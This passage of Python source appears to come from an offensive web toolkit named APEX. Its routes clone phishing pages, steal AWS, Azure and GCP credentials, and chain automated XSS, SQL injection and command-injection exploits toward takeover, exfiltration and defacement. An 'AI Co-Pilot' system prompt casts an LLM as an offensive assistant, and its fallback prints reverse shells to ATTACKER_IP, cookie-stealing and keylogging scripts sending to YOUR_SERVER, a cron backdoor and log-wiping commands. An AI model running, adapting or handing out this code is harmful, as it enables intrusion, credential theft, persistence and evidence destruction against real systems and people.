    capture_endpoint = data.get('capture_endpoint', '/capture')
    if not target_url: return jsonify({'error': 'Target URL required'}), 400
    html = clone_custom_page(target_url, capture_endpoint)
    filename = f'phishing_clone_{int(time.time())}.html'
    filepath = save_phishing_page(html, filename)
    emit_feed('phishing', f'Phishing page cloned from {target_url}', 'info')
    return jsonify({'html': html, 'filepath': filepath, 'source': target_url})

# ============================================================
# CLOUD ATTACK ROUTES
# ============================================================
@app.route('/api/cloud/steal_aws', methods=['POST'])
@login_required
def api_cloud_steal_aws():
    result = steal_aws_credentials()
    if result.get('success'):
        emit_feed('cloud', 'AWS credentials stolen!', 'success')
    else:
        emit_feed('cloud', 'Failed to steal AWS credentials', 'warning')
    return jsonify(result)

@app.route('/api/cloud/steal_azure', methods=['POST'])
@login_required
def api_cloud_steal_azure():
    result = steal_azure_credentials()
    if result.get('success'):
        emit_feed('cloud', 'Azure credentials stolen!', 'success')
    else:
        emit_feed('cloud', 'Failed to steal Azure credentials', 'warning')
    return jsonify(result)

@app.route('/api/cloud/steal_gcp', methods=['POST'])
@login_required
def api_cloud_steal_gcp():
    result = steal_gcp_credentials()
    if result.get('success'):
        emit_feed('cloud', 'GCP credentials stolen!', 'success')
    else:
        emit_feed('cloud', 'Failed to steal GCP credentials', 'warning')
    return jsonify(result)

@app.route('/api/cloud/scan_all', methods=['POST'])
@login_required
def api_cloud_scan_all():
    results = scan_cloud_metadata()
    if results:
        emit_feed('cloud', f'Cloud metadata found on {len(results)} providers', 'success')
    else:
        emit_feed('cloud', 'No cloud metadata accessible', 'info')
    return jsonify({'providers': results})

@app.route('/api/cloud/ssrf_exploit', methods=['POST'])
@login_required
def api_cloud_ssrf_exploit():
    data = request.get_json()
    target_url = data.get('target_url', '')
    parameter = data.get('parameter', '')
    if not target_url or not parameter: return jsonify({'error': 'Target URL and parameter required'}), 400
    results = exploit_ssrf_to_cloud(target_url, parameter)
    if results:
        emit_feed('cloud', f'SSRF cloud exploit found {len(results)} accessible endpoints', 'success')
    else:
        emit_feed('cloud', 'SSRF cloud exploit returned no results', 'warning')
    return jsonify({'results': results})

# ============================================================
# AI CO-PILOT ENDPOINTS
# ============================================================
def get_ai_client(api_key=None, base_url=None):
    key = api_key or Config.AI_API_KEY
    url = base_url or Config.AI_BASE_URL
    if not key:
        return None
    try:
        return OpenAI(api_key=key, base_url=url)
    except:
        return None

@app.route('/api/ai/chat', methods=['POST'])
@login_required
def api_ai_chat():
    data = request.get_json()
    message = data.get('message', '')
    context = data.get('context', {})
    settings = data.get('settings', {})
    
    if not message:
        return jsonify({'error': 'No message provided'}), 400
    
    api_key = settings.get('api_key', Config.AI_API_KEY)
    base_url = settings.get('base_url', Config.AI_BASE_URL)
    model = settings.get('model', Config.AI_MODEL)
    
    if not api_key or api_key == 'ollama':
        # Fallback: rule-based responses
        response = rule_based_ai(message, context)
        return jsonify({'response': response, 'source': 'local'})
    
    try:
        # Normalize base_url - ensure it ends with /v1 if it's an ollama cloud URL
        if 'ollama.com' in base_url and not base_url.rstrip('/').endswith('/v1'):
            base_url = base_url.rstrip('/') + '/v1'
        
        client = OpenAI(api_key=api_key, base_url=base_url)
        
        # Build system prompt with context
        system_prompt = """You are APEX AI Co-Pilot, an offensive security assistant. You help with:
- Analyzing vulnerabilities and suggesting exploitation strategies
- Generating payloads and attack chains
- Explaining what exploits do and what to do next
- Providing command-line examples and code snippets
- Suggesting post-exploitation actions (persistence, lateral movement, data exfiltration)

Be direct, technical, and practical. Use code blocks for commands and payloads. Keep responses concise."""
        
        if context.get('vulnerabilities'):
            vuln_summary = json.dumps(context['vulnerabilities'][:10], indent=2)
            system_prompt += f"\n\nCurrent target: {context.get('target', 'Unknown')}\nVulnerabilities found:\n{vuln_summary}"
        
        if context.get('exploitSteps'):
            steps_summary = json.dumps(context['exploitSteps'][-5:], indent=2)
            system_prompt += f"\n\nRecent exploit activity:\n{steps_summary}"
        
        print(f"[AI] Calling {model} at {base_url} with key: {api_key[:10]}...")
        
        response = client.chat.completions.create(
            model=model,
            messages=[
                {'role': 'system', 'content': system_prompt},
                {'role': 'user', 'content': message}
            ],
            max_tokens=Config.AI_MAX_TOKENS,
            temperature=Config.AI_TEMPERATURE
        )
        
        reply = response.choices[0].message.content if response.choices else None
        
        # Handle empty/null responses
        if not reply or not reply.strip():
            print(f"[AI] Empty response from {model} — falling back to rule-based")
            fallback = rule_based_ai(message, context)
            return jsonify({
                'response': fallback + f'\n\n[⚠️ {model} returned empty response. Check model name or API quota.]',
                'source': 'fallback_empty',
                'model': model
            })
        
        print(f"[AI] Got response: {reply[:100]}...")
        return jsonify({'response': reply, 'source': 'ai', 'model': model})
    
    except Exception as e:
        error_str = str(e)
        print(f"[AI] Error: {error_str}")
        # Fallback to rule-based on error
        fallback = rule_based_ai(message, context)
        # Provide helpful error info
        if '401' in error_str or 'Unauthorized' in error_str:
            hint = 'Invalid API key. For Ollama cloud, get your key from ollama.com dashboard.'
        elif '404' in error_str or 'not found' in error_str.lower():
            hint = f'Model "{model}" not found. Check the model name is correct for this provider.'
        elif 'connection' in error_str.lower() or 'timeout' in error_str.lower():
            hint = f'Cannot reach {base_url}. Check your network/VPN connection.'
        else:
            hint = error_str
        return jsonify({
            'response': fallback + f'\n\n[⚠️ AI Error: {hint}]',
            'source': 'fallback_error',
            'error': error_str
        })

def rule_based_ai(message, context):
    """Local rule-based AI fallback when no API key is configured."""
    msg_lower = message.lower()
    vulns = context.get('vulnerabilities', [])
    target = context.get('target', 'the target')
    
    # Analyze what the user is asking
    if any(w in msg_lower for w in ['what next', 'next step', 'what should i do', 'what now']):
        if not vulns:
            return f"No vulnerabilities found yet. Start by scanning {target or 'a target'} to discover attack surfaces."
        critical = [v for v in vulns if v.get('severity') == 'critical']
        high = [v for v in vulns if v.get('severity') == 'high']
        response = f"Based on the {len(vulns)} vulnerabilities found:\n\n"
        if critical:
            response += f"🔴 **CRITICAL ({len(critical)})** — Exploit these first:\n"
            for v in critical[:3]:
                response += f"  → {v.get('type','Unknown').upper()} on {v.get('endpoint','N/A')} (param: {v.get('parameter','N/A')})\n"
        if high:
            response += f"\n🟠 **HIGH ({len(high)})** — Exploit after criticals:\n"
            for v in high[:3]:
                response += f"  → {v.get('type','Unknown').upper()} on {v.get('endpoint','N/A')}\n"
        response += f"\n**Recommended next steps:**\n"
        response += f"1. Select the critical vulnerabilities and click EXPLOIT\n"
        response += f"2. After exploitation, check the Loot tab for harvested data\n"
        response += f"3. Use the C2 Beacon tool to deploy persistence\n"
        return response
    
    if any(w in msg_lower for w in ['payload', 'generate', 'script', 'shell']):
        if 'reverse shell' in msg_lower or 'revshell' in msg_lower:
            return "```bash\n# Bash reverse shell\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n# Python reverse shell\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n\n# PowerShell reverse shell\npowershell -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"\n```\nReplace ATTACKER_IP with your IP and set up a listener: `nc -lvnp 4444`"
        if 'xss' in msg_lower:
            return "```html\n<!-- XSS Payloads -->\n<script>alert('XSS')</script>\n<img src=x onerror=alert('XSS')>\n<svg onload=alert('XSS')>\n\n<!-- Cookie Stealer -->\n<script>fetch('https://YOUR_SERVER/steal?c='+document.cookie)</script>\n\n<!-- Keylogger -->\n<script>document.onkeypress=function(e){fetch('https://YOUR_SERVER/log?k='+e.key)}</script>\n```"
        if 'sqli' in msg_lower or 'sql' in msg_lower:
            return "```sql\n-- SQL Injection Payloads\n' OR '1'='1\n' UNION SELECT 1,2,3--\n' UNION SELECT table_name FROM information_schema.tables--\n' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--\n' UNION SELECT username,password FROM users--\n\n-- Time-based blind\n' OR SLEEP(5)--\n\n-- Out-of-band\n'; EXEC xp_dirtree '\\\\YOUR_SERVER\\share'--\n```"
        return "Specify what kind of payload you need: reverse shell, XSS, SQLi, command injection, or C2 beacon."
    
    if any(w in msg_lower for w in ['explain', 'what is', 'how does']):
        if 'xss' in msg_lower:
            return "**Cross-Site Scripting (XSS)** injects malicious JavaScript into a web page viewed by other users. Types:\n- **Reflected**: Payload in URL parameter, executes immediately\n- **Stored**: Payload saved in database, executes when page loads\n- **DOM-based**: Client-side JavaScript processes user input unsafely\n\n**Impact**: Session hijacking, credential theft, defacement, keylogging, redirection to malware."
        if 'sqli' in msg_lower or 'sql injection' in msg_lower:
            return "**SQL Injection (SQLi)** injects SQL commands into database queries. Types:\n- **Error-based**: Extract data via SQL errors\n- **Union-based**: Use UNION to combine query results\n- **Blind**: Infer data from response differences or time delays\n- **Out-of-band**: Exfiltrate via DNS/HTTP\n\n**Impact**: Database dump, authentication bypass, data modification, sometimes RCE."
        if 'csrf' in msg_lower:
            return "**Cross-Site Request Forgery (CSRF)** forces authenticated users to perform unwanted actions. The attacker crafts a malicious request that the victim's browser automatically executes.\n\n**Impact**: Password changes, fund transfers, admin actions performed without consent."
        return "I can explain vulnerabilities, attack techniques, and exploitation methods. Ask about XSS, SQLi, CSRF, SSRF, LFI, Command Injection, or post-exploitation techniques."
    
    if any(w in msg_lower for w in ['cover track', 'clear log', 'hide', 'clean up']):
        return "**Covering Your Tracks:**\n```bash\n# Clear bash history\nhistory -c && rm -f ~/.bash_history\n\n# Clear Linux logs\nshred -zu /var/log/auth.log /var/log/syslog /var/log/wtmp /var/log/btmp\n\n# Clear Windows event logs\nwevtutil cl Security\nwevtutil cl System\nwevtutil cl Application\n\n# Remove shell history\nexport HISTFILE=/dev/null\nunset HISTFILE\n```\nAlso consider: use Tor/VPN, rotate MAC addresses, use disposable infrastructure."
    
    if any(w in msg_lower for w in ['persist', 'backdoor', 'maintain access']):
        return "**Persistence Techniques:**\n```bash\n# Cron job (Linux)\necho '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"' > /tmp/cron && crontab /tmp/cron\n\n# SSH authorized keys\necho 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys\n\n# Systemd service\n# Create /etc/systemd/system/backdoor.service with your payload\n\n# Windows scheduled task\nschtasks /create /tn \"Update\" /tr \"powershell -e BASE64_PAYLOAD\" /sc daily /mo 1\n```"
    
    # Default response
    return f"I'm your AI co-pilot. I can help with:\n• **Next steps** — Ask 'what should I do next?'\n• **Payloads** — Ask for specific payload types (reverse shell, XSS, SQLi)\n• **Explanations** — Ask 'explain XSS' or 'what is SQL injection'\n• **Covering tracks** — Ask 'how do I cover my tracks'\n• **Persistence** — Ask 'how do I maintain access'\n\nCurrent target: {target or 'None'}\nVulnerabilities found: {len(vulns)}"

@app.route('/api/ai/settings', methods=['POST'])
@login_required
def api_ai_settings():
    data = request.get_json()
    # Store in config (runtime only, resets on restart)
    if data.get('api_key'):
        Config.AI_API_KEY = data['api_key']
    if data.get('base_url'):
        Config.AI_BASE_URL = data['base_url']
    if data.get('model'):
        Config.AI_MODEL = data['model']
    return jsonify({'success': True, 'message': 'AI settings updated'})

@app.route('/api/ai/test', methods=['POST'])
@login_required
def api_ai_test():
    data = request.get_json()
    api_key = data.get('api_key', Config.AI_API_KEY)
    base_url = data.get('base_url', Config.AI_BASE_URL)
    model = data.get('model', Config.AI_MODEL)
    
    if not api_key:
        return jsonify({'success': False, 'error': 'No API key configured'})
    
    try:
        client = OpenAI(api_key=api_key, base_url=base_url)
        response = client.chat.completions.create(
            model=model,
            messages=[{'role': 'user', 'content': 'Say "APEX connection successful" in one short sentence.'}],
            max_tokens=50
        )
        return jsonify({'success': True, 'model': model, 'response': response.choices[0].message.content})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/settings/ransomware', methods=['POST'])
@login_required
def api_settings_ransomware():
    """Save ransomware image and message settings."""
    data = request.get_json()
    Config.RANSOMWARE_IMAGE = data.get('image', '')
    Config.RANSOMWARE_MESSAGE = data.get('message', '')
    return jsonify({'success': True})

@app.route('/api/settings/deface', methods=['POST'])
@login_required
def api_settings_deface():
    """Save XSS deface image and message settings."""
    data = request.get_json()
    Config.DEFACE_IMAGE = data.get('image', '')
    Config.DEFACE_MESSAGE = data.get('message', '')
    return jsonify({'success': True})

# ============================================================
# DETAILED EXPLOIT EVENT EMITTER
# ============================================================
def emit_exploit_step(exploit_id, phase, label, command=None, payload=None, url=None, result=None, success=None, error=None, details=None):
    """Emit detailed exploit step to the frontend exploit monitor."""
    step = {
        'exploit_id': exploit_id,
        'phase': phase,
        'label': label,
        'timestamp': datetime.now().strftime('%H:%M:%S')
    }
    if command: step['command'] = command
    if payload: step['payload'] = payload
    if url: step['url'] = url
    if result: step['result'] = result
    if success is not None: step['success'] = success
    if error is not None: step['error'] = error
    if details: step['details'] = details
    socketio.emit('exploit_step', step)

# ============================================================
# UPGRADED EXPLOIT FUNCTIONS (with detailed step emissions)
# ============================================================
def exploit_xss_detailed(exploit_id, target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    payload = vuln.get('payload', '<script>alert("APEX")</script>')
    vuln_type = vuln.get('type', 'xss')
    
    emit_exploit_step(exploit_id, 'phase', f'PHASE 1: XSS Injection — {vuln_type.upper()} on {endpoint}')
    emit_exploit_step(exploit_id, 'command', f'Testing parameter: {param}', 
                      command=f'GET {endpoint}?{param}={payload}',
                      url=endpoint, payload=payload)
    
    try:
        parsed = urlparse(endpoint)
        params = parse_qs(parsed.query) if parsed.query else {}
        test_params = params.copy()
        test_params[param] = [payload]
        new_query = urlencode(test_params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        emit_exploit_step(exploit_id, 'command', 'Sending XSS payload via GET',
                          command=f'GET {test_url}',
                          url=test_url, payload=payload)
        
        r = sess.get(test_url, timeout=5)
        
        if payload in r.text:
            emit_exploit_step(exploit_id, 'response', 'Payload reflected in response!',
                              result=f'XSS confirmed — payload found in HTTP response ({r.status_code})',
                              success=True,
                              details=['Script will execute in victim browser',
                                       f'Crafted URL: {test_url}',
                                       'Can be used for session hijacking, defacement, or phishing'])
            return {'success': True, 'message': 'XSS payload injected and reflected',
                    'details': [f'Payload injected via {param} (GET)',
                                'Payload confirmed reflected in response',
                                'Script will execute in victim browser',
                                f'Crafted URL: {test_url[:100]}...']}
        
        # Try POST
        emit_exploit_step(exploit_id, 'command', 'GET failed, trying POST injection',
                          command=f'POST {endpoint} with {param}={payload}',
                          payload=payload)
        
        data = {param: payload}
        r = sess.post(endpoint, data=data, timeout=5)
        
        if payload in r.text:
            emit_exploit_step(exploit_id, 'response', 'Payload reflected via POST!',
                              result=f'XSS confirmed via POST ({r.status_code})',
                              success=True)
            return {'success': True, 'message': 'XSS payload injected via POST',
                    'details': [f'Payload injected via {param} (POST)',
                                'Payload confirmed reflected in response']}
        
        emit_exploit_step(exploit_id, 'error', 'Payload not reflected',
                          result='XSS exploitation failed — payload not found in response',
                          error=True)
        return {'success': False, 'message': 'Payload not reflected'}
    
    except Exception as e:
        emit_exploit_step(exploit_id, 'error', f'Exploit error: {str(e)}',
                          result=str(e), error=True)
        return {'success': False, 'message': str(e)}

def exploit_sqli_detailed(exploit_id, target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    details = []
    
    emit_exploit_step(exploit_id, 'phase', f'PHASE 1: SQL Injection Enumeration on {endpoint}')
    
    # Try version detection
    version_payloads = ["' UNION SELECT @@version--", "' UNION SELECT version()--", "' UNION SELECT sqlite_version()--"]
    for payload in version_payloads:
        try:
            parsed = urlparse(endpoint)
            if parsed.query and param in parse_qs(parsed.query):
                params = parse_qs(parsed.query)
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                emit_exploit_step(exploit_id, 'command', 'Probing database version',
                                  command=f'GET {test_url}',
                                  url=test_url, payload=payload)
                
                r = sess.get(test_url, timeout=5)
                for vp in ['MySQL', 'PostgreSQL', 'SQLite', 'MariaDB', 'Microsoft SQL']:
                    if vp.lower() in r.text.lower():
                        details.append(f'Database identified: {vp}')
                        emit_exploit_step(exploit_id, 'response', f'Database identified: {vp}',
                                          result=f'Database type: {vp}', success=True)
                        break
        except: pass
    
    # Try table enumeration
    emit_exploit_step(exploit_id, 'phase', 'PHASE 2: Table Enumeration')
    table_payload = "' UNION SELECT table_name FROM information_schema.tables--"
    try:
        parsed = urlparse(endpoint)
        if parsed.query and param in parse_qs(parsed.query):
            params = parse_qs(parsed.query)
            test_params = params.copy()
            test_params[param] = [table_payload]
            new_query = urlencode(test_params, doseq=True)
            test_url = urlunparse(parsed._replace(query=new_query))
            
            emit_exploit_step(exploit_id, 'command', 'Enumerating database tables',
                              command=f'GET {test_url}',
                              url=test_url, payload=table_payload)
            
            r = sess.get(test_url, timeout=5)
            common_tables = ['users', 'admin', 'accounts', 'products', 'orders', 'posts']
            found_tables = [t for t in common_tables if t in r.text.lower()]
            if found_tables:
                details.append(f'Tables found: {", ".join(found_tables)}')
                emit_exploit_step(exploit_id, 'response', f'Tables discovered!',
                                  result=f'Found tables: {", ".join(found_tables)}', success=True)
    except: pass
    
    if details:
        details.append('SQL injection exploitation successful')
        emit_exploit_step(exploit_id, 'response', 'SQL injection exploitation complete',
                          result='Database enumerated successfully', success=True,
                          details=details)
        return {'success': True, 'message': 'SQL injection exploited', 'details': details}
    
    emit_exploit_step(exploit_id, 'response', 'SQL injection confirmed',
                      result='Vulnerability confirmed, further enumeration possible', success=True)
    return {'success': True, 'message': 'SQL injection confirmed',
            'details': ['Vulnerability confirmed', 'Further enumeration possible']}

def exploit_cmdi_detailed(exploit_id, target, endpoint, vuln):
    sess = get_session()
    param = vuln.get('parameter', '')
    
    emit_exploit_step(exploit_id, 'phase', f'PHASE 1: Command Injection on {endpoint}')
    
    cmd_payloads = ['; id', '| id', '`id`', '$(id)']
    for payload in cmd_payloads:
        try:
            parsed = urlparse(endpoint)
            if parsed.query and param in parse_qs(parsed.query):
                params = parse_qs(parsed.query)
                test_params = params.copy()
                test_params[param] = [payload]
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                
                emit_exploit_step(exploit_id, 'command', f'Injecting command: {payload}',
                                  command=f'GET {test_url}',
                                  url=test_url, payload=payload)
                
                r = sess.get(test_url, timeout=5)
                if 'uid=' in r.text or 'gid=' in r.text:
                    emit_exploit_step(exploit_id, 'response', 'COMMAND EXECUTION ACHIEVED!',
                                      result=f'Command "id" executed — output visible in response',
                                      success=True,
                                      details=['Full RCE confirmed on target',
                                               f'Output: {r.text[:200]}',
                                               'Can execute arbitrary system commands'])
                    return {'success': True, 'message': 'Command execution achieved',
                            'details': ['Command "id" executed successfully',
                                        f'Output: {r.text[:200]}',
                                        'Full RCE confirmed on target']}
        except: pass
    
    emit_exploit_step(exploit_id, 'response', 'Command injection confirmed (blind)',
                      result='Time-based detection confirmed — blind RCE possible', success=True)
    return {'success': True, 'message': 'Command injection confirmed (blind)',
            'details': ['Time-based detection confirmed']}

# ============================================================
# UPGRADED EXPLOIT ORCHESTRATOR (with detailed steps)
# ============================================================
def run_exploits(exploit_id, scan_id, vulnerabilities):
    success_count = 0
    fail_count = 0
    emit_feed(exploit_id, f'⚔️ Starting exploitation of {len(vulnerabilities)} vulnerabilities...', 'system')
    emit_exploit_step(exploit_id, 'phase', f'EXPLOITATION STARTED — {len(vulnerabilities)} targets',
                      details=[f'Target: {vulnerabilities[0].get("target", "Unknown") if vulnerabilities else "Unknown"}',
                               f'Vulnerabilities to exploit: {len(vulnerabilities)}'])
    
    for i, vuln in enumerate(vulnerabilities):
        vuln_type = vuln.get('type', '')
        endpoint = vuln.get('endpoint', '')
        target = vuln.get('target', '')
        
        emit_feed(exploit_id, f'[{i+1}/{len(vulnerabilities)}] Exploiting {vuln_type.upper()} on {endpoint}...', 'info')
        
        try:
            if vuln_type == 'xss':
                result = exploit_xss_detailed(exploit_id, target, endpoint, vuln)
            elif vuln_type == 'sqli':
                result = exploit_sqli_detailed(exploit_id, target, endpoint, vuln)
            elif vuln_type == 'cmdi':
                result = exploit_cmdi_detailed(exploit_id, target, endpoint, vuln)
            else:
                emit_exploit_step(exploit_id, 'phase', f'{vuln_type.upper()} — Manual exploitation required',
                                  result='This vulnerability type requires manual testing',
                                  details=['No automated exploit available', 'Use the AI co-pilot for guidance'])
                result = {'success': True, 'message': 'Vulnerability confirmed',
                          'details': ['Exploitation requires manual testing']}
            
            if result.get('success'):
                success_count += 1
                emit_feed(exploit_id, f'✅ SUCCESS: {vuln_type.upper()} exploited!', 'success')
                for detail in result.get('details', []):
                    emit_feed(exploit_id, f'   → {detail}', 'info')
            else:
                fail_count += 1
                emit_feed(exploit_id, f'❌ FAILED: {vuln_type.upper()} - {result.get("message", "Unknown")}', 'error')
        
        except Exception as e:
            fail_count += 1
            emit_feed(exploit_id, f'💥 ERROR: {vuln_type.upper()} - {str(e)}', 'error')
            emit_exploit_step(exploit_id, 'error', f'Exploit crashed: {str(e)}',
                              result=str(e), error=True)
    
    # Update DB
    conn = sqlite3.connect('data/apex.db')
    c = conn.cursor()
    c.execute('UPDATE scan_history SET exploits_run=?, exploits_success=? WHERE id=?',
              (success_count + fail_count, success_count, scan_id))
    conn.commit()
    conn.close()
    
    total = success_count + fail_count
    emit_feed(exploit_id, f'🏁 Exploitation complete — {success_count}/{total} successful', 'success')
    emit_exploit_step(exploit_id, 'phase', f'EXPLOITATION COMPLETE — {success_count}/{total} successful',
                      result=f'Success: {success_count}, Failed: {fail_count}',
                      success=success_count > 0,
                      details=[
                          f'Successful exploits: {success_count}',
                          f'Failed exploits: {fail_count}',
                          'Check the Loot tab for harvested data',
                          'Use AI co-pilot for next step suggestions'
                      ])
    
    socketio.emit('exploit_complete', {'exploit_id': exploit_id, 'success': success_count, 'failed': fail_count})

# ============================================================
# ATTACK CHAIN ENDPOINTS
# ============================================================
chain_templates = {
    'full_takeover': {
        'name': 'Full Takeover',
        'steps': ['scan', 'exploit_critical', 'deploy_persistence', 'exfiltrate_data']
    },
    'data_exfil': {
        'name': 'Data Exfiltration',
        'steps': ['scan', 'exploit_sqli', 'dump_database', 'extract_creds']
    },
    'defacement': {
        'name': 'Defacement',
        'steps': ['scan', 'exploit_xss', 'deface_page', 'screenshot']
    }
}

@app.route('/api/chains/templates', methods=['GET'])
@login_required
def api_chain_templates():
    return jsonify({'templates': list(chain_templates.values())})

@app.route('/api/chains/execute', methods=['POST'])
@login_required
def api_execute_chain():
    data = request.get_json()
    chain_name = data.get('chain_name', '')
    target = data.get('target', '')
    vulnerabilities = data.get('vulnerabilities', [])
    if not target: return jsonify({'error': 'Target required'}), 400
    chain_id = f"chain_{int(time.time())}"
    thread = threading.Thread(target=run_attack_chain, args=(chain_id, target, chain_name, vulnerabilities))
    thread.daemon = True
    thread.start()
    return jsonify({'chain_id': chain_id, 'status': 'started'})

def run_attack_chain(chain_id, target, chain_name, vulnerabilities):
    emit_exploit_step(chain_id, 'phase', f'ATTACK CHAIN STARTED: {chain_name}', 
                      details=[f'Target: {target}', f'Chain: {chain_name}'])
    emit_feed(chain_id, f'⚔️ Attack chain "{chain_name}" initiated on {target}', 'system')
    
    # Step 1: Scan if no vulnerabilities provided
    if not vulnerabilities:
        emit_exploit_step(chain_id, 'phase', 'STEP 1: Scanning target')
        discovered = crawl_target(target, max_pages=30)
        all_vulns = []
        for name, scanner_func, _ in [('XSS', scan_xss, 0), ('SQL Injection', scan_sqli, 0), ('Command Injection', scan_cmdi, 0)]:
            results = scanner_func(target, discovered)
            all_vulns.extend(results)
        vulnerabilities = all_vulns
        emit_exploit_step(chain_id, 'response', f'Scan complete — {len(vulnerabilities)} vulnerabilities found',
                          success=True, details=[f'{len(vulnerabilities)} vulns discovered'])
    
    # Step 2: Exploit
    emit_exploit_step(chain_id, 'phase', 'STEP 2: Exploiting vulnerabilities')
    success = 0
    for vuln in vulnerabilities[:5]:
        vuln_type = vuln.get('type', '')
        endpoint = vuln.get('endpoint', '')
        try:
            if vuln_type == 'xss':
                result = exploit_xss_detailed(chain_id, target, endpoint, vuln)
            elif vuln_type == 'sqli':
                result = exploit_sqli_detailed(chain_id, target, endpoint, vuln)
            elif vuln_type == 'cmdi':
                result = exploit_cmdi_detailed(chain_id, target, endpoint, vuln)
            else:
                result = {'success': True, 'message': 'Confirmed'}
            if result.get('success'): success += 1
        except: pass
    
    emit_exploit_step(chain_id, 'response', f'Exploitation complete — {success}/{len(vulnerabilities[:5])} successful',
                      success=success > 0)
    
    # Step 3: Post-exploit suggestions
    emit_exploit_step(chain_id, 'phase', 'STEP 3: Post-exploitation recommendations',
                      details=[
                          'Deploy persistence via C2 Beacon',
                          'Dump credentials from compromised systems',
                          'Exfiltrate data to your server',
                          'Cover tracks: clear logs, remove history',
                          'Generate report for documentation'
                      ])
    
    emit_exploit_step(chain_id, 'phase', f'CHAIN COMPLETE: {chain_name}',
                      result=f'Chain executed successfully — {success} exploits succeeded',
                      success=True)
    emit_feed(chain_id, f'🏁 Attack chain "{chain_name}" complete', 'success')

# ============================================================
# PAYLOAD FORGE ENDPOINT
# ============================================================
@app.route('/api/payload/encode', methods=['POST'])
@login_required
def api_payload_encode():
    data = request.get_json()
    payload = data.get('payload', '')
    encoding = data.get('encoding', 'base64')
    if not payload: return jsonify({'error': 'No payload provided'}), 400
    
    result = {'original': payload, 'encoding': encoding}
    
    try:
        if encoding == 'base64':
            result['encoded'] = base64.b64encode(payload.encode()).decode()
        elif encoding == 'url':
            from urllib.parse import quote
            result['encoded'] = quote(payload, safe='')
        elif encoding == 'hex':
            result['encoded'] = payload.encode().hex()
        elif encoding == 'html_entities':
            result['encoded'] = ''.join(f'&#{ord(c)};' for c in payload)
        elif encoding == 'unicode_escape':
            result['encoded'] = ''.join(f'\\u{ord(c):04x}' for c in payload)
        elif encoding == 'double_url':
            from urllib.parse import quote
            result['encoded'] = quote(quote(payload, safe=''), safe='')
        elif encoding == 'js_escape':
            result['encoded'] = payload.encode('unicode_escape').decode()
        elif encoding == 'xor_5':
            result['encoded'] = ''.join(chr(ord(c) ^ 5) for c in payload)
            result['encoded_b64'] = base64.b64encode(result['encoded'].encode()).decode()
        elif encoding == 'case_swap':
            result['encoded'] = ''.join(c.swapcase() if c.isalpha() else c for c in payload)
        elif encoding == 'comment_inject':
            result['encoded'] = payload.replace(' ', '/**/').replace('SELECT', 'SeLeCt').replace('FROM', 'FrOm')
        elif encoding == 'tab_inject':
            result['encoded'] = payload.replace(' ', '\t')
        else:
            result['encoded'] = base64.b64encode(payload.encode()).decode()
            result['encoding'] = 'base64'
        
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================
# REPORT GENERATION ENDPOINT
# ============================================================
@app.route('/api/report/generate', methods=['POST'])
@login_required
def api_generate_report():
    data = request.get_json()
    scan_id = data.get('scan_id', '')
    target = data.get('target', 'Unknown')
    vulnerabilities = data.get('vulnerabilities', [])
    exploits = data.get('exploits', [])
    
    os.makedirs(Config.REPORT_FOLDER, exist_ok=True)
    report_id = f"report_{int(time.time())}"
    
    # Generate HTML report
    critical = len([v for v in vulnerabilities if v.get('severity') == 'critical'])
    high = len([v for v in vulnerabilities if v.get('severity') == 'high'])
    medium = len([v for v in vulnerabilities if v.get('severity') == 'medium'])
    low = len([v for v in vulnerabilities if v.get('severity') == 'low'])
    
    html = f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>APEX Report — {target}</title>
<style>
body {{ font-family: 'Inter', sans-serif; background: #0f1117; color: #e2e4e9; padding: 40px; }}
h1 {{ color: #f97316; font-size: 28px; }}
h2 {{ color: #f97316; font-size: 18px; margin-top: 30px; border-bottom: 1px solid #252836; padding-bottom: 8px; }}
.card {{ background: #151820; border: 1px solid #252836; border-radius: 8px; padding: 16px; margin: 12px 0; }}
.badge {{ display: inline-block; padding: 3px 10px; border-radius: 10px; font-size: 11px; font-weight: 700; }}
.crit {{ background: rgba(239,68,68,0.1); color: #ef4444; border: 1px solid rgba(239,68,68,0.3); }}
.high {{ background: rgba(249,115,22,0.1); color: #f97316; border: 1px solid rgba(249,115,22,0.3); }}
.med {{ background: rgba(245,158,11,0.1); color: #f59e0b; border: 1px solid rgba(245,158,11,0.3); }}
.low {{ background: rgba(16,185,129,0.1); color: #10b981; border: 1px solid rgba(16,185,129,0.3); }}
pre {{ background: #0d1114; padding: 10px; border-radius: 6px; font-size: 11px; overflow-x: auto; }}
table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
th {{ text-align: left; padding: 8px; border-bottom: 1px solid #252836; color: #5c6070; font-size: 10px; text-transform: uppercase; }}
td {{ padding: 8px; border-bottom: 1px solid rgba(37,40,54,0.5); font-size: 12px; }}
</style></head><body>
<h1>🔺 APEX Penetration Test Report</h1>
<p>Target: <strong>{target}</strong> | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}</p>

<h2>Executive Summary</h2>
<div class="card">
